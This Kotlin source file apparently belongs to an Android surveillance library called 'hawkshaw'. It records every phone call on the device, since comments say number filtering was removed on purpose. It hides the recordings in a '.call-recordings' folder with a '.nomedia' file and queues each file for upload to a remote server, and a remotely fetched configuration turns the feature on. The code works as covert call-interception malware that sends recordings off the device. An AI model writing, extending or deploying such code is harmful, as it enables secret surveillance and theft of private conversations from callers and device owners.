package com.hawkshaw.library.features.telephony

// import com.hawkshaw.library.App // Assuming App.db or similar might be used by CallRecordNumberEntity - This import seems unused directly.
// import com.hawkshaw.library.features.media.MediaService // If CallRecorder directly interacts or is used by it - This import seems unused in this file.
// import com.hawkshaw.library.ktextensions.ServiceKt // Removed as not directly used.
// import com.hawkshaw.library.ktextensions.putArgs // Removed as not directly used.
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.telephony.TelephonyManager
import android.util.Log
import com.hawkshaw.library.config.DynamicConfigKt
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.DynamicConfig
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity
import com.hawkshaw.library.features.accessibility.MainAccessibilityService
import com.hawkshaw.library.features.media.filecrud.startPushFileService
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

// This StringMatcher is specific to CallRecorder.kt context
object StringMatcher {
    private const val MATCHER_TAG = "CallRecStringMatcher"
    fun g(pattern: String, input: String): Int {
        Log.d(MATCHER_TAG, "[DEBUG] g called. Pattern: \"$pattern\", Input: \"$input\"")
        val result = if (input.contains(pattern, ignoreCase = true)) 1 else 0
        Log.d(MATCHER_TAG, "[DEBUG] g result: $result")
        return result
    }
}

class CallRecorder(private val context: Context) {
    init {
        Log.d(Companion.TAG, "[DEBUG] CallRecorder instance initialized with context: $context")
    }

    companion object Companion {
        private const val TAG = "CallRecorderLogs"
        private const val FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS"

        @JvmField // Changed from @Volatile var to @JvmField for AtomicBoolean
        val isRecording: AtomicBoolean = AtomicBoolean(false)
        var lastState: Int = TelephonyManager.CALL_STATE_IDLE

        @Volatile
        var currentRecordingNumber: String? = null
        // This list will no longer be populated or used for matching if we record all calls.
        // private var callRecordNumbersList: List<CallRecordNumberEntity> = emptyList()

        /* Commented out as we aim to record all calls, bypassing number-specific checks.
        suspend fun loadCallRecordNumbersFromDb(appContext: Context) {
            if (AppDatabaseKt.dbInitialized.value != true) {
                Log.w(TAG, "[DEBUG] Companion.loadCallRecordNumbersFromDb: Database not initialized. Skipping load.")
                // callRecordNumbersList = emptyList() // callRecordNumbersList is now commented out
                return
            }
            withContext(Dispatchers.IO) {
                try {
                    // callRecordNumbersList = AppDatabaseKt.db.telephonyDao().getCallRecordNumbers().first()
                    // Log.d(TAG, "[DEBUG] Companion.loadCallRecordNumbersFromDb: Fetched ${callRecordNumbersList.size} numbers.")
                } catch (e: Exception) {
                    Log.e(TAG, "[DEBUG] Companion.loadCallRecordNumbersFromDb: Error loading numbers: ${e.message}", e)
                    // callRecordNumbersList = emptyList()
                }
            }
        }
        */

        /* Commented out as we aim to record all calls, bypassing number-specific checks.
        private suspend fun getMatch(context: Context, number: String?, currentNumbersList: List<CallRecordNumberEntity>): CallRecordNumberEntity? {
            Log.d(TAG, "[DEBUG] Companion.getMatch called. Number: \"$number\"")
            if (number == null) {
                Log.d(TAG, "[DEBUG] Companion.getMatch: Number is null, cannot match. Returning null.")
                return null
            }

            // val listToUse: List<CallRecordNumberEntity> = if (currentNumbersList.isEmpty() && callRecordNumbersList.isEmpty()) {
            //     Log.d(TAG, "[DEBUG] Companion.getMatch: callRecordNumbersList is empty. Attempting to reload.")
            //     // loadCallRecordNumbersFromDb(context.applicationContext) // loadCallRecordNumbersFromDb is commented out
            //     // callRecordNumbersList // callRecordNumbersList is commented out
            //    emptyList() // Fallback if above were active
            // } else if (currentNumbersList.isNotEmpty()) {
            //    currentNumbersList
            // } else {
            //    // callRecordNumbersList
            //    emptyList() // Fallback if callRecordNumbersList were active
            // }

            // if (listToUse.isEmpty()) {
            //     Log.d(TAG, "[DEBUG] Companion.getMatch: callRecordNumbersList is still empty after check/reload. Returning null.")
            //     return null
            // }

            // Log.d(TAG, "[DEBUG] Companion.getMatch: Iterating through listToUse (${listToUse.size} entries).")
            // for (record in listToUse) {
            //     if (!record.name.isNullOrEmpty() && record.name == "HAWKSHAW_ALL") {
            //         Log.d(TAG, "[DEBUG] Companion.getMatch: Matched HAWKSHAW_ALL. Returning record.")
            //         return record
            //     }
            //     if (!record.number.isNullOrEmpty()) {
            //         val matchResult = StringMatcher.g(record.number!!, number)
            //         Log.d(TAG, "[DEBUG] Companion.getMatch: StringMatcher.g result for ${record.number} vs $number: $matchResult")
            //         if (matchResult == 1) {
            //             Log.d(TAG, "[DEBUG] Companion.getMatch: Match found. Returning record.")
            //             return record
            //         }
            //     }
            // }
            Log.d(TAG, "[DEBUG] Companion.getMatch: No match found after iterating (logic bypassed for all call recording). Returning null.")
            return null // Or a dummy entity if some downstream logic expected a non-null for other reasons.
                       // For now, returning null is fine as its usage is removed below.
        }
        */

        @JvmStatic
        suspend fun onCallStateChanged(context: Context, state: Int, number: String?, blocked: Boolean) {
            Log.d(TAG, "[DEBUG] Companion.onCallStateChanged received - State: ${TelephonyCallbackService.toStateString(state)} ($state), Number: \"$number\", Blocked: $blocked, LastState: ${TelephonyCallbackService.toStateString(lastState)}, IsRecording: ${isRecording.get()}, CurrentRecNum: \"$currentRecordingNumber\"")

            if (blocked) {
                Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: Call is blocked. Ensuring recording is stopped if active.")
                if (isRecording.getAndSet(false)) { // Atomically check and set to false
                    dispatchStopCallRecordingIntent(context, currentRecordingNumber ?: number)
                }
                lastState = TelephonyManager.CALL_STATE_IDLE
                currentRecordingNumber = null // Keep this here as it's tied to blocked state.
                return
            }

            if (!number.isNullOrBlank()) {
                if (currentRecordingNumber.isNullOrBlank() || currentRecordingNumber != number) {
                    Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: Updating currentRecordingNumber from \"$currentRecordingNumber\" to \"$number\".")
                    currentRecordingNumber = number
                }
            }

            Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: Bypassing number matching. Will attempt to record all calls if feature enabled. Number: \"${currentRecordingNumber}\".")

            when (state) {
                TelephonyManager.CALL_STATE_RINGING -> {
                    Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: State is RINGING. Effective number: \"$currentRecordingNumber\"")
                    // isRecording state is not changed here, only on OFFHOOK or IDLE
                }
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: State is OFFHOOK. Effective number: \"${currentRecordingNumber}\". Last state was: ${TelephonyCallbackService.toStateString(lastState)}")
                    if (!isRecording.get()) { // Check current state
                        isRecording.set(true) // Set to true as call is now active
                        Log.d(TAG, "[DEBUG] Companion.onCallStateChanged (OFFHOOK): Set isRecording to true. Current number: \"${currentRecordingNumber}\".")
                        val incoming = (lastState == TelephonyManager.CALL_STATE_RINGING)
                        dispatchStartCallRecordingIntent(context, currentRecordingNumber, incoming)
                    } else {
                        Log.d(TAG, "[DEBUG] Companion.onCallStateChanged (OFFHOOK): Already recording (isRecording is true). Current number: \"${currentRecordingNumber}\".")
                    }
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: State is IDLE. Effective number: \"${currentRecordingNumber}\". Last state was: ${TelephonyCallbackService.toStateString(lastState)}")
                    if (isRecording.getAndSet(false)) { // Atomically check if it was recording, then set to false
                        Log.d(TAG, "[DEBUG] Companion.onCallStateChanged (IDLE): Was recording or last state was not IDLE. Stopping recording. Current number: \"${currentRecordingNumber}\".")
                        dispatchStopCallRecordingIntent(context, currentRecordingNumber)
                    } else {
                        Log.d(TAG, "[DEBUG] Companion.onCallStateChanged (IDLE): No active recording to stop (isRecording was false) or already processed IDLE.")
                    }
                    // currentRecordingNumber will be set to null by MediaService or stopCallRecording in MediaService
                }
                else -> {
                    Log.w(TAG, "[DEBUG] Companion.onCallStateChanged: Unknown call state: $state")
                }
            }

            if (state != lastState) {
                Log.d(TAG, "[DEBUG] Companion.onCallStateChanged: Updating lastState from ${TelephonyCallbackService.toStateString(lastState)} to ${TelephonyCallbackService.toStateString(state)}.")
                lastState = state
            }
        }

        @JvmStatic
        fun updateNumberForCurrentRecording(newNumber: String?) {
            // This logic might need review based on how currentRecordingNumber is now managed,
            // but for now, keep it as is, as it relies on isRecording.get()
            Log.d(TAG, "[DEBUG] Companion.updateNumberForCurrentRecording called. New number: \"$newNumber\". Current recording number: \"$currentRecordingNumber\", isRecording: ${isRecording.get()}")
            if (isRecording.get()) {
                if (newNumber != null && currentRecordingNumber != newNumber) {
                    Log.d(TAG, "[DEBUG] Companion.updateNumberForCurrentRecording: Active recording. Updating currentRecordingNumber from \"$currentRecordingNumber\" to \"$newNumber\".")
                    currentRecordingNumber = newNumber
                }
            } else {
                 if (newNumber != null && (currentRecordingNumber.isNullOrBlank() || currentRecordingNumber != newNumber)) {
                    currentRecordingNumber = newNumber
                    Log.d(TAG, "[DEBUG] Companion.updateNumberForCurrentRecording: Not recording. Updated currentRecordingNumber to \"$newNumber\".")
                 }
            }
        }

        // Renamed and modified: This now ONLY dispatches the intent.
        @JvmStatic
        private fun dispatchStartCallRecordingIntent(context: Context, phoneNumber: String?, incoming: Boolean) {
            // The check for isRecording.get() is removed here; onCallStateChanged handles the decision to call this.
            Log.d(TAG, "[DEBUG] Companion.dispatchStartCallRecordingIntent called. Number: \"$phoneNumber\", Incoming: $incoming.")
            // currentRecordingNumber is already set by onCallStateChanged
            
            Intent(context, MainAccessibilityService::class.java).apply {
                putExtra("call_recorder", true)
                putExtra("type", "StartCallRecording")
                putExtra("phone_number", phoneNumber ?: "Unknown") // Use the passed phoneNumber
                putExtra("isIncoming", incoming)
                Log.d(TAG, "[DEBUG] Companion.dispatchStartCallRecordingIntent: Starting MainAccessibilityService with extras - phone_number:${phoneNumber ?: "Unknown"}, isIncoming:$incoming")
                context.startService(this)
            }
        }

        // Renamed and modified: This now ONLY dispatches the intent.
        @JvmStatic
        private fun dispatchStopCallRecordingIntent(context: Context, phoneNumber: String?) {
            // The check for !isRecording.get() is removed here; onCallStateChanged handles the decision.
            Log.d(TAG, "[DEBUG] Companion.dispatchStopCallRecordingIntent called. Number: \"$phoneNumber\".")
            // isRecording state is managed by onCallStateChanged or MediaService

            Intent(context, MainAccessibilityService::class.java).apply {
                putExtra("call_recorder", true)
                putExtra("type", "StopCallRecording")
                putExtra("phone_number", phoneNumber ?: currentRecordingNumber ?: "Unknown")
                Log.d(TAG, "[DEBUG] Companion.dispatchStopCallRecordingIntent: Starting MainAccessibilityService with extras for stopping.")
                context.startService(this)
            }
        }
    }

    private val mr: MediaRecorder by lazy {
        Log.d(TAG, "[DEBUG] MediaRecorder instance being created for CallRecorder instance (lazy init). Context: $context")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        recorder.apply {
            setOnErrorListener { _, what, extra ->
                Log.e(TAG, "[DEBUG] CallRecorder instance MediaRecorder onError. What: $what, Extra: $extra")
                Logger.e(TAG, "Media Recorder Error: What $what, Extra $extra", b = false, i = 12, nothing = null)
                this@CallRecorder.stopRecordingInstance() // This will also try to set Companion.isRecording to false
            }
            setOnInfoListener { _, what, extra ->
                Log.d(TAG, "[DEBUG] CallRecorder instance MediaRecorder onInfo. What: $what, Extra: $extra")
                Logger.d(TAG, "Media Recorder Info: What $what, Extra $extra", false, 4, null)
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    Log.d(TAG, "[DEBUG] CallRecorder instance MediaRecorder: Max duration reached. Stopping recording.")
                    this@CallRecorder.stopRecordingInstance() // This will also try to set Companion.isRecording to false
                }
            }
        }
    }

    private fun getOutputFile(extension: String, phoneNumber: String?): File {
        val safePhoneNumber = if (phoneNumber.isNullOrBlank()) "Unknown" else phoneNumber.replace(Regex("[^a-zA-Z0-9_.-]"), "_")
        Log.d(TAG, "[DEBUG] CallRecorder instance getOutputFile called. Extension: \"$extension\", SafePhoneNumber: \"$safePhoneNumber\"")

        val recordingsDir = context.getExternalFilesDir(".call-recordings") ?: run {
            Log.e(TAG, "[DEBUG] CallRecorder instance getOutputFile: getExternalFilesDir returned null. Using fallback public directory.")
            @Suppress("DEPRECATION")
            val fallbackDir = File(Environment.getExternalStorageDirectory(), ".call-recordings")
            fallbackDir.mkdirs()
            fallbackDir
        }
        if (!recordingsDir.exists()) {
            recordingsDir.mkdirs()
        }
        Log.d(TAG, "[DEBUG] CallRecorder instance getOutputFile: Recordings directory: ${recordingsDir.absolutePath}")

        File(recordingsDir, ".nomedia").let { nomediaFile ->
            if (!nomediaFile.exists()) {
                try {
                    nomediaFile.createNewFile()
                    Log.d(TAG, "[DEBUG] .nomedia file created successfully in ${recordingsDir.absolutePath}")
                } catch (e: Exception) {
                    Log.e(TAG, "[DEBUG] Error creating .nomedia file in ${recordingsDir.absolutePath}: ${e.message}")
                }
            }
        }

        val timestamp = SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(System.currentTimeMillis())
        val fileName = "call_rec_${safePhoneNumber}_${timestamp}.$extension"
        val outputFile = File(recordingsDir, fileName)
        Log.d(TAG, "[DEBUG] CallRecorder instance getOutputFile: Final output file: ${outputFile.absolutePath}")
        return outputFile
    }

    suspend fun isCallRecordingAvailable(): Boolean {
        Log.d(TAG, "[DEBUG] CallRecorder instance.isCallRecordingAvailable called.")
        val config: DynamicConfig.CallRecorder? = DynamicConfigKt.getDynamicConfig().callRecorder
        val isAvailable = config != null
        Log.d(TAG, "[DEBUG] CallRecorder instance.isCallRecordingAvailable: Result: $isAvailable, Config: $config")
        return isAvailable
    }

    fun startRecordingInstance(phoneNumberForFile: String?) {
        // The initial 'if (!Companion.isRecording.get())' check is REMOVED. 
        // MediaService will perform this check before calling this method.
        val numberToUse = phoneNumberForFile ?: Companion.currentRecordingNumber
        Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance called. Number for file: \"$numberToUse\".")

        try {
            Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Fetching dynamic config.")
            val dynamicConfig = DynamicConfigKt.getDynamicConfig()
            val callRecorderConfig: DynamicConfig.CallRecorder? = dynamicConfig.callRecorder

            if (callRecorderConfig == null) {
                Log.e(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: DynamicConfig.CallRecorder is null. Cannot start.")
                Logger.e(TAG, "DynamicConfig.CallRecorder is null. Cannot start recording.", b = false, i = 12, nothing = null)
                Companion.isRecording.set(false) // Ensure flag is false on config error
                return
            }

            Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Config - AudioSource: ${callRecorderConfig.audioSource}, OutputFormat: ${callRecorderConfig.outputFormat}, AudioEncoder: ${callRecorderConfig.audioEncoder}, FileUploadMedium: ${callRecorderConfig.fileUploadMedium}")

            mr.setAudioSource(callRecorderConfig.audioSource)
            mr.setOutputFormat(callRecorderConfig.outputFormat)
            mr.setAudioEncoder(callRecorderConfig.audioEncoder)

            val outputFile = getOutputFile(if (callRecorderConfig.outputFormat == MediaRecorder.OutputFormat.AMR_NB) "amr" else "3gp", numberToUse)
            mr.setOutputFile(outputFile.absolutePath)

            Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Preparing MediaRecorder...")
            mr.prepare()
            Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Starting MediaRecorder...")
            mr.start()
            // If MediaRecorder started successfully, Companion.isRecording should be true (set by onCallStateChanged).
            // No need to set it true here.
            Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: MediaRecorder started successfully for: ${outputFile.name}")

            CoroutineScope(Dispatchers.IO + SupervisorJob()).safeLaunch {
                Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Coroutine for PushFileTaskEntity (file: ${outputFile.name}).")
                val task = PushFileTaskEntity(
                    path = outputFile.path,
                    source = Command.FileRequest.Source.CallRecording,
                    medium = callRecorderConfig.fileUploadMedium ?: Command.FileRequest.Medium.Grpc,
                    buffer = 0
                )
                Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Saving PushFileTaskEntity: $task")
                AppDatabaseKt.db.pushFileTaskDao().insert(task)
                Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: PushFileTaskEntity insert attempt done for ${outputFile.name}.")

                startPushFileService()
                Log.d(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Called startPushFileService (file: ${outputFile.name}).")
            }

        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] CallRecorder instance.startRecordingInstance: Exception: ${e.message}", e)
            Logger.e(TAG, "Start recording failed: ${e.message}", null, false, 12, null)
            Companion.isRecording.set(false) // Crucial: ensure flag is false on any error during start
            try {
                mr.reset()
                Log.d(TAG, "[DEBUG] MediaRecorder reset successfully after start failure.")
            } catch (resetEx: Exception) {
                Log.e(TAG, "[DEBUG] Error resetting MediaRecorder after start failure: ${resetEx.message}")
            }
        }
    }

    fun stopRecordingInstance() {
        Log.d(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance called. Current Companion.isRecording: ${Companion.isRecording.get()}")
        try {
            // Attempt to stop media recorder only if it was indeed recording or prepared
            // This relies on MediaRecorder's own state, not Companion.isRecording directly here
            mr.stop()
            Log.d(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: MediaRecorder stopped.")
        } catch (e: IllegalStateException) {
             Log.w(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: IllegalStateException stopping MediaRecorder (often means not started or already stopped): ${e.message}")
        } catch (e: RuntimeException) {
            Log.e(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: RuntimeException stopping MediaRecorder: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: Exception stopping MediaRecorder: ${e.message}", e)
            Logger.e(TAG, "Stop recording failed: ${e.message}", null, false, 12, null)
        } finally {
            try {
                mr.reset()
                Log.d(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: MediaRecorder reset.")
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: Exception resetting MediaRecorder: ${e.message}")
            }
            // Always ensure the global recording flag is set to false after attempting to stop.
            if (Companion.isRecording.getAndSet(false)) { // Atomically set to false and check old value
                 Log.w(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: Companion.isRecording was true. Set to false.")
            } else {
                 Log.d(TAG, "[DEBUG] CallRecorder instance.stopRecordingInstance: Companion.isRecording was already false.")
            }
        }
    }
}
